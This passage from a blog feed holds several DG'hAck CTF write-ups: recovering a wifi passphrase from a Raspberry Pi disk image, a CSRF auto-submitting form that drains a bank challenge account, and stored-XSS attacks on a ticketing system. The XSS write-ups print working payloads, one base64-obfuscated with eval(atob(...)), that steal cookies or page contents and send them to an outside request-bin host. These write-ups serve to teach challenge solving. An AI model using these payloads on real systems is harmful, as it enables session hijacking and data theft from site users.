&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Server Room</title><link>https://nicolasb.fr/blog/writeup-dghack-server-room/</link><pubDate>Thu, 19 Nov 2020 05:00:05 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-server-room/</guid><description>This challenge starts with a file, found_in_server_room.img.gz. Let&amp;rsquo;s first try to find what this file is:
$ gunzip found_in_server_room.img.gz $ file found_in_server_room.img found_in_server_room.img: DOS/MBR boot sector; partition 1 : ID=0xc, start-CHS (0x40,0,1), end-CHS (0x3ff,3,32), startsector 8192, 524288 sectors; partition 2 : ID=0x83, start-CHS (0x3ff,3,32), end-CHS (0x3ff,3,32), startsector 532480, 3072000 sectors So this is a disk image. Let&amp;rsquo;s try mounting it!
$ mkdir mnt $ sudo mount found_in_server_room.img mnt NTFS signature is missing.</description><content>&lt;p>This challenge starts with a file, &lt;code>found_in_server_room.img.gz&lt;/code>. Let&amp;rsquo;s first try to find what this file is:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ gunzip found_in_server_room.img.gz
$ file found_in_server_room.img
found_in_server_room.img: DOS/MBR boot sector; partition &lt;span style="color:#ae81ff">1&lt;/span> : ID&lt;span style="color:#f92672">=&lt;/span>0xc, start-CHS &lt;span style="color:#f92672">(&lt;/span>0x40,0,1&lt;span style="color:#f92672">)&lt;/span>, end-CHS &lt;span style="color:#f92672">(&lt;/span>0x3ff,3,32&lt;span style="color:#f92672">)&lt;/span>, startsector 8192, &lt;span style="color:#ae81ff">524288&lt;/span> sectors; partition &lt;span style="color:#ae81ff">2&lt;/span> : ID&lt;span style="color:#f92672">=&lt;/span>0x83, start-CHS &lt;span style="color:#f92672">(&lt;/span>0x3ff,3,32&lt;span style="color:#f92672">)&lt;/span>, end-CHS &lt;span style="color:#f92672">(&lt;/span>0x3ff,3,32&lt;span style="color:#f92672">)&lt;/span>, startsector 532480, &lt;span style="color:#ae81ff">3072000&lt;/span> sectors
&lt;/code>&lt;/pre>&lt;/div>&lt;p>So this is a disk image. Let&amp;rsquo;s try mounting it!&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ mkdir mnt
$ sudo mount found_in_server_room.img mnt
NTFS signature is missing.
Failed to mount &lt;span style="color:#e6db74">&amp;#39;/dev/loop0&amp;#39;&lt;/span>: Invalid argument
The device &lt;span style="color:#e6db74">&amp;#39;/dev/loop0&amp;#39;&lt;/span> doesn&lt;span style="color:#960050;background-color:#1e0010">&amp;#39;&lt;/span>t seem to have a valid NTFS.
Maybe the wrong device is used? Or the whole disk instead of a
partition &lt;span style="color:#f92672">(&lt;/span>e.g. /dev/sda, not /dev/sda1&lt;span style="color:#f92672">)&lt;/span>? Or the other way around?
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Huh.&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">$ fdisk -l found_in_server_room.img
Disk found_in_server_room.img: 1.72 GiB, &lt;span style="color:#ae81ff">1845493248&lt;/span> bytes, &lt;span style="color:#ae81ff">3604479&lt;/span> sectors
Units: sectors of &lt;span style="color:#ae81ff">1&lt;/span> * 512 &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">512&lt;/span> bytes
Sector size &lt;span style="color:#f92672">(&lt;/span>logical/physical&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
I/O size &lt;span style="color:#f92672">(&lt;/span>minimum/optimal&lt;span style="color:#f92672">)&lt;/span>: &lt;span style="color:#ae81ff">512&lt;/span> bytes / &lt;span style="color:#ae81ff">512&lt;/span> bytes
Disklabel type: dos
Disk identifier: 0x907af7d0
Device Boot Start End Sectors Size Id Type
found_in_server_room.img1 &lt;span style="color:#ae81ff">8192&lt;/span> &lt;span style="color:#ae81ff">532479&lt;/span> &lt;span style="color:#ae81ff">524288&lt;/span> 256M c W95 FAT32 &lt;span style="color:#f92672">(&lt;/span>LBA&lt;span style="color:#f92672">)&lt;/span>
found_in_server_room.img2 &lt;span style="color:#ae81ff">532480&lt;/span> &lt;span style="color:#ae81ff">3604479&lt;/span> &lt;span style="color:#ae81ff">3072000&lt;/span> 1.5G &lt;span style="color:#ae81ff">83&lt;/span> Linux
&lt;/code>&lt;/pre>&lt;/div>&lt;p>fdisk does find the partitions, but for some reason we can&amp;rsquo;t mount them (even by setting the offset). Using testdisk, we&amp;rsquo;re able to navigate through the files by selecting:&lt;/p>
&lt;ul>
&lt;li>&lt;code>found_in_server_room.img&lt;/code>&lt;/li>
&lt;li>Intel&lt;/li>
&lt;li>Advanced&lt;/li>
&lt;li>The first or the second partition&lt;/li>
&lt;li>Boot &amp;gt; List or just List&lt;/li>
&lt;/ul>
&lt;p>The first partition does not contain anything useful, just necessary boot files. The other partition is a typical linux root:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/server-room-root.png">&lt;img src="https://nicolasb.fr/assets/dghack/server-room-root.png" alt="The linux partition">&lt;/a>&lt;/p>
&lt;p>The first thing that comes to mind is to check the &lt;code>.bash_history&lt;/code>. The one of the &lt;code>pi&lt;/code> user is rather empty:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">sudo systemctl halt
&lt;/code>&lt;/pre>&lt;/div>&lt;p>But the one of the &lt;code>root&lt;/code> user contains quite a few commands (76 of them, to be exact). Here are the ones where nano is used:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-bash" data-lang="bash">nano wpa_supplicant.conf
nano hostapd
nano /etc/sysctl.d/90-routing.conf
nano /etc/dnsmasq.conf
nano /etc/dhcpcd.conf
nano /etc/dnsmasq.conf
nano /etc/wpa_supplicant/wpa_supplicant.conf
nano /etc/wpa_supplicant/wpa_supplicant.conf
nano /etc/wpa_supplicant/wpa_supplicant.conf.old
nano /etc/dnsmasq.conf
nano /etc/hostapd/hostapd.conf
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The &lt;code>wpa_supplicant.conf&lt;/code> file does not yield anything too interesting:&lt;/p>
&lt;pre>&lt;code>1598621524 02:6c:0d:3b:04:17 192.168.100.171 OnePlus5T 01:02:6c:0d:3b:04:17
&lt;/code>&lt;/pre>&lt;p>But the &lt;code>hostapd.conf&lt;/code> one does:&lt;/p>
&lt;pre>&lt;code>country_code=FR
interface=wlan0
ssid=BackpackNet
hw_mode=g
channel=11
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=BackpackBackdoorNet
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
&lt;/code>&lt;/pre>&lt;p>The flag is the wifi password: &lt;code>BackpackBackdoorNet&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Up Credit</title><link>https://nicolasb.fr/blog/writeup-dghack-up-credit/</link><pubDate>Thu, 19 Nov 2020 04:29:21 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-up-credit/</guid><description>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200â‚¬!
Let&amp;rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:
After logging in, we are presented with an interface that has three tabs:
an activity log a money transfer form a form to contact our financial advisor Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted.</description><content>&lt;p>The challenge URL redirects us to an online bank. The summary tells us that we have to buy the flag for 200â‚¬!&lt;/p>
&lt;p>Let&amp;rsquo;s start by registering for an account. After entering our name and email, we get an account ID and a password:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/upcredit-registration.png">&lt;img src="https://nicolasb.fr/assets/dghack/upcredit-registration.png" alt="The registration message">&lt;/a>&lt;/p>
&lt;p>After logging in, we are presented with an interface that has three tabs:&lt;/p>
&lt;ul>
&lt;li>an activity log&lt;/li>
&lt;li>a money transfer form&lt;/li>
&lt;li>a form to contact our financial advisor&lt;/li>
&lt;/ul>
&lt;p>Trying an XSS in the contact form quickly reveals that the bot doesn&amp;rsquo;t execute any javascript, but does click any link that is posted. This will probably be useful later on.&lt;/p>
&lt;p>Let&amp;rsquo;s look at the money transfer form:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/upcredit-money-transfer.png">&lt;img src="https://nicolasb.fr/assets/dghack/upcredit-money-transfer.png" alt="The money transfer form">&lt;/a>&lt;/p>
&lt;p>It looks quite simple. After registering another account and trying:&lt;/p>
&lt;ul>
&lt;li>sending money we don&amp;rsquo;t have&lt;/li>
&lt;li>sending huge amounts of money&lt;/li>
&lt;li>sending negative amounts of money&lt;/li>
&lt;li>some sqli&lt;/li>
&lt;/ul>
&lt;p>We find out that the form is quite secure. But wait, it doesn&amp;rsquo;t have any CSRF token! Let&amp;rsquo;s try exploiting that. Using &lt;a href="ngrok.com">ngrok&lt;/a>, we create a webpage and temporarily host it.&lt;/p>
&lt;p>In it, we copy the form which we fill out, and add a little bit of JS to automatically submit it:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">form&lt;/span> &lt;span style="color:#a6e22e">action&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;http://upcredit4.chall.malicecyber.com/transfer&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">method&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;post&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;col-md-12 col-sm-12 col-xs-12&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-group&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-control&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;account&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">placeholder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Account number&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;account&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Aln6qOfUJ&amp;#34;&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-group&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">input&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;number&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;form-control&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">placeholder&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;Amount&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;amount&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">value&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;200&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;help-block with-errors&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">style&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;color: #f00&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;pull-right&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">button&lt;/span> &lt;span style="color:#a6e22e">type&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;submit&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;reg-submit&amp;#34;&lt;/span>
&lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;btn btn-md btn-common btn-log&amp;#34;&lt;/span>&amp;gt;Send
&amp;lt;/&lt;span style="color:#f92672">button&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">id&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;msgSubmit&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;h3 text-center hidden&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;clearfix&amp;#34;&lt;/span>&amp;gt;&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">form&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">script&lt;/span>&amp;gt;
&lt;span style="color:#a6e22e">form&lt;/span>.&lt;span style="color:#a6e22e">submit&lt;/span>()
&amp;lt;/&lt;span style="color:#f92672">script&lt;/span>&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After posting the link to our form in the contact area and waiting for a few seconds, we get a money transfer:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/upcredit-credited.png">&lt;img src="https://nicolasb.fr/assets/dghack/upcredit-credited.png" alt="The money transfer form">&lt;/a>&lt;/p>
&lt;p>And we can buy the flag: &lt;code>W1nG4rD1um\L3v1os444!&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Internal Support 2</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</link><pubDate>Thu, 19 Nov 2020 03:45:38 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-2/</guid><description>This is the second version of the ticketing system presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:
&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://enx8b5ofkwzw.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we manage to steal a cookie! However, we can&amp;rsquo;t use it, as the session is ip-locked:
Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page.</description><content>&lt;p>This is the second version of the &lt;a href="https://nicolasb.fr/blog/writeup-dghack-internal-support-1">ticketing system&lt;/a> presented in the CTF. We are greeted with the exact same interface. So let&amp;rsquo;s try exactly the same payload:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">svg&lt;/span> &lt;span style="color:#a6e22e">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://enx8b5ofkwzw.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34;&lt;/span> /&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>After a few seconds, we manage to steal a cookie! However, we can&amp;rsquo;t use it, as the session is ip-locked:&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/internal-support-2-ip-denied.png">&lt;img src="https://nicolasb.fr/assets/dghack/internal-support-2-ip-denied.png" alt="The IP-lock error message">&lt;/a>&lt;/p>
&lt;p>Hmm. The challenge is quite similar to the last one, so we know that the flag is probably on the home page. Let&amp;rsquo;s try reading it using some XHR!&lt;/p>
&lt;p>The JS we&amp;rsquo;ll inject is going to be:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">request&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">XMLHttpRequest&lt;/span>();
&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">onreadystatechange&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">function&lt;/span> () {
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">DONE&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">DONE&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#ae81ff">4&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#66d9ef">this&lt;/span>.&lt;span style="color:#a6e22e">readyState&lt;/span> &lt;span style="color:#f92672">===&lt;/span> &lt;span style="color:#a6e22e">DONE&lt;/span>){
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">encoded&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">btoa&lt;/span>(&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">responseText&lt;/span>);
document.&lt;span style="color:#a6e22e">location&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;https://enx8b5ofkwzw.x.pipedream.net?&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">encoded&lt;/span>;
}
};
&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">open&lt;/span>(&lt;span style="color:#e6db74">&amp;#39;GET&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;/&amp;#39;&lt;/span>, &lt;span style="color:#66d9ef">true&lt;/span>);
&lt;span style="color:#a6e22e">request&lt;/span>.&lt;span style="color:#a6e22e">send&lt;/span>(&lt;span style="color:#66d9ef">null&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>NOTE : we can&amp;rsquo;t use the &lt;code>fetch&lt;/code> api, the bot must not be that up to date.&lt;/p>
&lt;p>Which translates to this payload:&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">svg&lt;/span> &lt;span style="color:#a6e22e">onload&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;eval(atob(&amp;#39;dmFyIHJlcXVlc3QgPSBuZXcgWE1MSHR0cFJlcXVlc3QoKTsKcmVxdWVzdC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbiAoKSB7CiAgICB2YXIgRE9ORSA9IHRoaXMuRE9ORSB8fCA0OwogICAgaWYgKHRoaXMucmVhZHlTdGF0ZSA9PT0gRE9ORSl7CiAgICAgICAgdmFyIGVuY29kZWQgPSBidG9hKHJlcXVlc3QucmVzcG9uc2VUZXh0KTsKICAgICAgICBkb2N1bWVudC5sb2NhdGlvbiA9ICdodHRwczovL2VueDhiNW9ma3d6dy54LnBpcGVkcmVhbS5uZXQ/JyArIGVuY29kZWQ7CiAgICB9Cn07CnJlcXVlc3Qub3BlbignR0VUJywgJy8nLCB0cnVlKTsKcmVxdWVzdC5zZW5kKG51bGwpOw==&amp;#39;))&amp;#34;&lt;/span> /&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>And there we go, after a few seconds, we get our html. In it, we find the todo-list :&lt;/p>
&lt;div class="highlight">&lt;pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&amp;lt;&lt;span style="color:#f92672">section&lt;/span> &lt;span style="color:#a6e22e">style&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;margin-top: 50px;&amp;#34;&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;pt-95 pb-100&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;container&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;row justify-content-center&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;col-lg-8&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;section-title pb-20&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">h4&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;title&amp;#34;&lt;/span>&amp;gt;TODOLIST&amp;lt;/&lt;span style="color:#f92672">h4&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;row justify-content-center&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;col-lg-8&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">div&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;section-title pb-20&amp;#34;&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">p&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>&amp;gt;
- Fix the kernel panic problem on the servers
&amp;lt;/&lt;span style="color:#f92672">p&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">p&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>&amp;gt;
- Find a solution for the XSS on the helpdesk system
&amp;lt;/&lt;span style="color:#f92672">p&lt;/span>&amp;gt;
&amp;lt;&lt;span style="color:#f92672">p&lt;/span> &lt;span style="color:#a6e22e">class&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#e6db74">&amp;#34;text&amp;#34;&lt;/span>&amp;gt;
- Hide the flag &amp;amp;#34;BEtter_BUT_ST!LL_N0tttttttttt++Prfct!&amp;amp;#34; a little bit better
&amp;lt;/&lt;span style="color:#f92672">p&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">div&lt;/span>&amp;gt;
&amp;lt;/&lt;span style="color:#f92672">section&lt;/span>&amp;gt;
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Which contains the flag: &lt;code>BEtter_BUT_ST!LL_N0tttttttttt++Prfct!&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://nicolasb.fr/tags/dghack">View all of the DG&amp;rsquo;hAck articles&lt;/a>.&lt;/p></content></item><item><title>Writeup DG'hAck: Internal Support 1</title><link>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</link><pubDate>Thu, 19 Nov 2020 03:19:55 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-dghack-internal-support-1/</guid><description>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :
Trying a classic xss (&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;) in the message field seems to work. We know that we have to login as an admin user, so let&amp;rsquo;s try stealing the cookies :
&amp;lt;svg onload=&amp;#34;document.body.innerHTML=document.body.innerHTML.concat(&amp;#39;&amp;lt;img src=\&amp;#39;https://eni7j9jobszxl.x.pipedream.net/&amp;#39;.concat(btoa(document.cookie)).concat(&amp;#39;\&amp;#39; /&amp;gt;&amp;#39;))&amp;#34; /&amp;gt; After a few seconds, we get a request on our request bin, which when decoded gives us the admin cookie :</description><content>&lt;p>The challenge presents itself as a ticketing system. After registering for an account, we are greeted with this page :&lt;/p>
&lt;p>&lt;a href="https://nicolasb.fr/assets/dghack/internal-support-1.png">&lt;img src="https://nicolasb.fr/assets/dghack/internal-support-1.png" alt="The ticketing system">&lt;/a>&lt;/p>
&lt;p>Trying a classic xss (&lt;code>&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&lt;/code>) in the message field seems to work. We know that we have to login as an admin user, so let&amp;rsquo;s try stealing the cookies :&lt;/p>
